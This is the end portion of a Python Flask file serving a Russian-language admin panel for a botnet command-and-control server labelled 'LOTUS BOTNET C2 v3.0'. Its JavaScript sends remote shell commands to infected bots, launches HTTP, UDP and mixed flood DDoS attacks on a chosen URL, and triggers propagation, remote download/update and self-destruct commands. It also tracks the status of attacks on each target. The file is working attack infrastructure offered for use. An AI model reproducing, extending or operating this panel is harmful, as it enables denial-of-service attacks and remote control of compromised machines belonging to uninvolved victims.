    refreshBots();
    addConsole('error', '🗑️ Бот удален: ' + id);
}

async function deleteAllBots() {
    if (!confirm('Удалить ВСЕХ ботов?')) return;
    const data = await (await fetch('/api/bots')).json();
    for (const bot of data) {
        const fd = new FormData(); fd.append('id', bot.id);
        await fetch('/api/delete_bot', { method: 'POST', body: fd });
    }
    refreshBots();
    addConsole('error', '🗑️ Все боты удалены');
}

// ===================== ЛОГИ =====================
async function refreshLogs() {
    try {
        const r = await fetch('/api/logs?limit=200');
        const data = await r.json();
        const container = document.getElementById('logsContainer');
        container.innerHTML = '';
        if (data.length === 0) {
            container.innerHTML = '<div class="text-muted" style="padding:20px;text-align:center;">Логов нет</div>';
            return;
        }
        data.forEach(log => {
            const div = document.createElement('div');
            div.className = 'log-entry';
            const time = new Date(log.timestamp * 1000).toLocaleTimeString();
            let msg = log.message || '';
            let cls = '';
            if (msg.includes('200')) cls = 'status-2xx';
            else if (msg.includes('503')) cls = 'status-5xx';
            else if (msg.includes('429')) cls = 'status-4xx';
            else if (msg.includes('4')) cls = 'status-4xx';
            else if (msg.includes('5')) cls = 'status-5xx';
            div.innerHTML = `<span class="time">[${time}]</span><span class="bot">${log.bot_id}</span><span class="msg"><span class="${cls}">${msg}</span></span>`;
            container.appendChild(div);
        });
    } catch {}
}

async function clearLogs() {
    if (!confirm('Очистить логи?')) return;
    await fetch('/api/clear_logs', { method: 'POST' });
    refreshLogs();
    addConsole('info', '🗑️ Логи очищены');
}

// ===================== СТАТУСЫ АТАК =====================
async function refreshAttackStatus() {
    try {
        const r = await fetch('/api/attack_stats?limit=200');
        const data = await r.json();
        const container = document.getElementById('statusContainer');
        container.innerHTML = '';
        if (data.length === 0) {
            container.innerHTML = '<div class="text-muted" style="padding:20px;text-align:center;">Нет данных об атаках</div>';
            return;
        }
        const targets = {};
        data.forEach(item => {
            if (!targets[item.target]) targets[item.target] = [];
            targets[item.target].push(item);
        });
        for (const [target, items] of Object.entries(targets)) {
            const div = document.createElement('div');
            div.className = 'status-target';
            const stats = {};
            items.forEach(item => {
                const code = item.status_code || 'Unknown';
                stats[code] = (stats[code] || 0) + 1;
            });
            let html = `<div class="target-name">🎯 ${target}</div><div class="codes">`;
            for (const [code, count] of Object.entries(stats)) {
                let color = '#8899bb';
                if (code.includes('200')) color = '#2ecc71';
                else if (code.includes('3')) color = '#f39c12';
                else if (code.includes('429')) color = '#f39c12';
                else if (code.includes('4')) color = '#f39c12';
                else if (code.includes('5')) color = '#e74c3c';
                html += `<span style="color:${color};">${code}: ${count}</span>`;
            }
            html += '</div><div class="recent">Последние: ';
            const last5 = items.slice(0, 5);
            last5.forEach((item) => {
                const time = new Date(item.timestamp * 1000).toLocaleTimeString();
                let color = '#8899bb';
                if (item.status_code && item.status_code.includes('200')) color = '#2ecc71';
                else if (item.status_code && item.status_code.includes('5')) color = '#e74c3c';
                else if (item.status_code && item.status_code.includes('429')) color = '#f39c12';
                html += `<span style="color:${color};">[${time}] ${item.status_code || 'Unknown'}</span> `;
            });
            html += '</div>';
            div.innerHTML = html;
            container.appendChild(div);
        }
    } catch {}
}

// ===================== КОМАНДЫ =====================
async function refreshCommands() {
    try {
        const r = await fetch('/api/logs?limit=50');
        const data = await r.json();
        const tbody = document.getElementById('commandsBody');
        tbody.innerHTML = '';
        if (data.length === 0) {
            tbody.innerHTML = '<tr><td colspan="4" class="text-muted" style="text-align:center;padding:20px;">Нет выполненных команд</td></tr>';
            return;
        }
        data.slice(0, 30).forEach(log => {
            const tr = document.createElement('tr');
            let status = 'done';
            let statusText = '✅ Выполнено';
            if (log.message.includes('ERROR')) { status = 'error'; statusText = '❌ Ошибка'; }
            else if (log.message.includes('pending')) { status = 'pending'; statusText = '⏳ Ожидание'; }
            else if (log.message.includes('executing')) { status = 'executing'; statusText = '🔄 Выполняется'; }
            tr.innerHTML = `<td class="id-cell">${log.bot_id}</td><td>${log.message.substring(0, 30)}</td><td><span class="status-badge ${status}">${statusText}</span></td><td>${new Date(log.timestamp * 1000).toLocaleTimeString()}</td>`;
            tbody.appendChild(tr);
        });
    } catch {}
}

// ===================== ОТПРАВКА КОМАНД =====================
async function sendCommand(e) {
    e.preventDefault();
    const botId = document.getElementById('cmdBotSelect').value;
    const command = document.getElementById('cmdType').value;
    const params = document.getElementById('cmdParams').value;
    const fd = new FormData();
    fd.append('bot_id', botId);
    fd.append('command', command);
    fd.append('params', params);
    await fetch('/api/send_command', { method: 'POST', body: fd });
    document.getElementById('cmdParams').value = '';
    refreshStats();
    addConsole('success', '✅ Команда отправлена: ' + command + ' ' + params + ' -> ' + botId);
}

async function quickCmd(botId, command, params) {
    const fd = new FormData();
    fd.append('bot_id', botId);
    fd.append('command', command);
    fd.append('params', params);
    await fetch('/api/send_command', { method: 'POST', body: fd });
    refreshStats();
    addConsole('success', '✅ Команда отправлена: ' + command + ' -> ' + botId);
}

// ===================== DDoS =====================
async function startDDoS(e) {
    e.preventDefault();
    const target = document.getElementById('ddosTarget').value;
    const type = document.getElementById('ddosType').value;
    if (!target) return;
    const fd = new FormData();
    fd.append('bot_id', 'all');
    fd.append('command', type);
    fd.append('params', target);
    await fetch('/api/send_command', { method: 'POST', body: fd });
    document.getElementById('ddosTarget').value = '';
    refreshStats();
    addConsole('success', '🔥 ' + type + ' атака запущена на ' + target);
    if (!statusInterval) statusInterval = setInterval(refreshAttackStatus, 3000);
}

async function stopAttack() {
    const fd = new FormData();
    fd.append('bot_id', 'all');
    fd.append('command', 'stop_attack');
    fd.append('params', '');
    await fetch('/api/send_command', { method: 'POST', body: fd });
    addConsole('success', '⏹ Все атаки остановлены');
    if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
}

// ===================== КОНСОЛЬ =====================
function addConsole(type, text) {
    const output = document.getElementById('consoleOutput');
    const div = document.createElement('div');
    const time = new Date().toLocaleTimeString();
    let cls = type;
    if (text.includes('200')) cls = 'status-2xx';
    else if (text.includes('503')) cls = 'status-5xx';
    else if (text.includes('429')) cls = 'status-4xx';
    else if (text.includes('4')) cls = 'status-4xx';
    else if (text.includes('5')) cls = 'status-5xx';
    div.innerHTML = `<span style="color:#556688;">[${time}]</span> <span class="${cls}">${text}</span>`;
    output.appendChild(div);
    output.scrollTop = output.scrollHeight;
}

function clearConsole() {
    document.getElementById('consoleOutput').innerHTML = `
        <div class="info">╔═══════════════════════════════════════════════════╗</div>
        <div class="info">║  🐍 LOTUS BOTNET C2 v3.0 - КОНСОЛЬ УПРАВЛЕНИЯ     ║</div>
        <div class="info">╚═══════════════════════════════════════════════════╝</div>
        <div class="info">💡 Введите help для списка команд</div>
        <div style="margin-top:8px; border-top:1px solid var(--border-color); padding-top:8px;"></div>
    `;
}

function exportConsole() {
    const output = document.getElementById('consoleOutput');
    const text = output.innerText;
    const blob = new Blob([text], { type: 'text/plain' });
    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = 'console_log_' + new Date().toISOString().slice(0,10) + '.txt';
    a.click();
}

// ===================== ВЫПОЛНЕНИЕ КОМАНД КОНСОЛИ =====================
async function executeConsoleCommand() {
    const input = document.getElementById('consoleInput');
    const cmd = input.value.trim();
    if (!cmd) return;
    input.value = '';
    addConsole('prompt', '> ' + cmd);
    const parts = cmd.split(/\s+/);
    const command = parts[0].toLowerCase();
    const args = parts.slice(1);
    
    try {
        switch(command) {
            case 'help':
                addConsole('info', 'Доступные команды:');
                addConsole('info', '  help - это меню');
                addConsole('info', '  list - список ботов');
                addConsole('info', '  cmd <команда> - CMD на всех ботах');
                addConsole('info', '  cmd <бот_id> <команда> - CMD на конкретном');
                addConsole('info', '  ddos <url> - HTTP Flood');
                addConsole('info', '  udp <url> - UDP Flood');
                addConsole('info', '  mix <url> - ВСЕ ТИПЫ ОДНОВРЕМЕННО');
                addConsole('info', '  info <бот_id> - информация о боте');
                addConsole('info', '  kill <бот_id> - самоуничтожение');
                addConsole('info', '  spread - распространение');
                addConsole('info', '  stop - остановить все атаки');
                addConsole('info', '  ping - проверить соединение');
                addConsole('info', '  stats - статистика');
                addConsole('info', '  logs - показать логи');
                addConsole('info', '  clear - очистить логи');
                addConsole('info', '  clearconsole - очистить консоль');
                break;
            case 'list': {
                const r = await fetch('/api/bots');
                const bots = await r.json();
                if (bots.length === 0) addConsole('info', 'Нет подключенных ботов');
                else {
                    addConsole('info', '🤖 Ботов: ' + bots.length);
                    bots.forEach(b => {
                        const status = b.status === 'online' ? '🟢' : '🔴';
                        addConsole('info', `  ${status} ${b.id} (${b.ip || 'N/A'})`);
                    });
                }
                break;
            }
            case 'stats': await refreshStats(); addConsole('info', '📊 Статистика обновлена'); break;
            case 'logs': await refreshLogs(); addConsole('info', '📋 Логи обновлены'); break;
            case 'clear': await clearLogs(); break;
            case 'clearconsole': clearConsole(); break;
            case 'stop': await stopAttack(); break;
            case 'ping': {
                const fd = new FormData();
                fd.append('bot_id', 'all');
                fd.append('command', 'ping');
                fd.append('params', '');
                await fetch('/api/send_command', { method: 'POST', body: fd });
                addConsole('success', '🏓 Ping отправлен всем ботам');
                break;
            }
            case 'cmd': {
                if (args.length === 0) { addConsole('error', '❌ Использование: cmd <команда>'); break; }
                let target = 'all';
                let cmdToExec = args.join(' ');
                if (args.length > 1 && args[0].startsWith('BOT_')) {
                    target = args[0];
                    cmdToExec = args.slice(1).join(' ');
                }
                const fd = new FormData();
                fd.append('bot_id', target);
                fd.append('command', 'cmd');
                fd.append('params', cmdToExec);
                await fetch('/api/send_command', { method: 'POST', body: fd });
                addConsole('success', `💻 CMD отправлен ${target}: ${cmdToExec}`);
                break;
            }
            case 'ddos': {
                if (args.length === 0) { addConsole('error', '❌ Использование: ddos <url>'); break; }
                const fd = new FormData();
                fd.append('bot_id', 'all');
                fd.append('command', 'http_flood');
                fd.append('params', args[0]);
                await fetch('/api/send_command', { method: 'POST', body: fd });
                addConsole('success', `🔥 DDoS запущен на ${args[0]}`);
                if (!statusInterval) statusInterval = setInterval(refreshAttackStatus, 3000);
                break;
            }
            case 'udp': {
                if (args.length === 0) { addConsole('error', '❌ Использование: udp <url>'); break; }
                const fd = new FormData();
                fd.append('bot_id', 'all');
                fd.append('command', 'udp_flood');
                fd.append('params', args[0]);
                await fetch('/api/send_command', { method: 'POST', body: fd });
                addConsole('success', `🔥 UDP Flood запущен на ${args[0]}`);
                break;
            }
            case 'mix': {
                if (args.length === 0) { addConsole('error', '❌ Использование: mix <url>'); break; }
                const fd = new FormData();
                fd.append('bot_id', 'all');
                fd.append('command', 'mix_flood');
                fd.append('params', args[0]);
                await fetch('/api/send_command', { method: 'POST', body: fd });
                addConsole('success', `⚡ MIX ATTACK запущен на ${args[0]}`);
                break;
            }
            case 'info': {
                const target = args.length > 0 ? args[0] : 'all';
                const fd = new FormData();
                fd.append('bot_id', target);
                fd.append('command', 'info');
                fd.append('params', '');
                await fetch('/api/send_command', { method: 'POST', body: fd });
                addConsole('success', `📊 Запрос информации отправлен ${target}`);
                break;
            }
            case 'kill': {
                if (args.length === 0) { addConsole('error', '❌ Использование: kill <бот_id>'); break; }
                const fd = new FormData();
                fd.append('bot_id', args[0]);
                fd.append('command', 'selfdestruct');
                fd.append('params', '');
                await fetch('/api/send_command', { method: 'POST', body: fd });
                addConsole('success', `💀 Самоуничтожение отправлено ${args[0]}`);
                break;
            }
            case 'spread': {
                const fd = new FormData();
                fd.append('bot_id', 'all');
                fd.append('command', 'spread');
                fd.append('params', '');
                await fetch('/api/send_command', { method: 'POST', body: fd });
                addConsole('success', '📀 Распространение запущено на всех ботах');
                break;
            }
            case 'download': {
                if (args.length === 0) { addConsole('error', '❌ Использование: download <url>'); break; }
                const fd = new FormData();
                fd.append('bot_id', 'all');
                fd.append('command', 'download');
                fd.append('params', args[0]);
                await fetch('/api/send_command', { method: 'POST', body: fd });
                addConsole('success', `📥 Скачивание отправлено: ${args[0]}`);
                break;
            }
            case 'update': {
                if (args.length === 0) { addConsole('error', '❌ Использование: update <url>'); break; }
                const fd = new FormData();
                fd.append('bot_id', 'all');
                fd.append('command', 'update');
                fd.append('params', args[0]);
                await fetch('/api/send_command', { method: 'POST', body: fd });
                addConsole('success', `🔄 Обновление отправлено: ${args[0]}`);
                break;
            }
            default:
                addConsole('error', `❌ Неизвестная команда: ${command}. Введите help`);
        }
    } catch(e) {
        addConsole('error', '❌ Ошибка: ' + e.message);
    }
    refreshStats();
}

// ===================== ИНИЦИАЛИЗАЦИЯ =====================
document.getElementById('consoleInput').addEventListener('keydown', function(e) {
    if (e.key === 'Enter') { e.preventDefault(); executeConsoleCommand(); }
});

setInterval(refreshStats, 3000);
setInterval(refreshBots, 15000);
setInterval(refreshLogs, 5000);
setInterval(refreshAttackStatus, 3000);

// Часы
setInterval(() => {
    document.getElementById('headerTime').textContent = new Date().toLocaleTimeString();
}, 1000);

refreshStats();
refreshBots();
refreshLogs();
refreshAttackStatus();
refreshCommands();

// Показ уведомления при загрузке
addConsole('info', '✅ Система загружена. Ожидание команд...');
</script>

</body>
</html>
'''

@app.route('/admin')
def admin():
    return render_template_string(HTML_TEMPLATE)

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
